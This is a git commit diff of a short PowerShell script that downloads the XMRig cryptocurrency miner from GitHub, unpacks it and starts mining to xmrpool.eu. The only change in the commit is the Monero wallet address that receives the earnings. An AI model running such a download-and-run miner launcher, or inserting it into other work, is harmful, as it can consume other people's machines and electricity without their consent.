02f608585a217d3c51de814efa863fc8597139bf
3450D <149199412+3450D@users.noreply.github.com>
2024-08-23 09:35:20 +0300

    Update windows.ps1

--- windows.ps1
+++ windows.ps1
@@ -1,3 +1,3 @@
 Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip" -OutFile "xmrig.zip"
 Expand-Archive xmrig.zip
-.\xmrig\xmrig-6.21.3\xmrig.exe -o xmrpool.eu:3333 -u 4BCzRFseZPce3GUMsqGEHjeSgzzBhE3C72JdGdapz3kgdWpq4ri7NbNfTKCotSdAP2a6c6f4Qq3XHWRMJX1EYJnrDrSeJG3 --cpu-priority 4
+.\xmrig\xmrig-6.21.3\xmrig.exe -o xmrpool.eu:3333 -u 4ADWN2XDnqCX595WjRbkVD8iYSd6Pa4Psgi1x2LTANd395ykeqS2Bc1WnEkEQYeM1s2N6KbL1fwGbD1Tw1ahfsrNFLkQEHE --cpu-priority 4
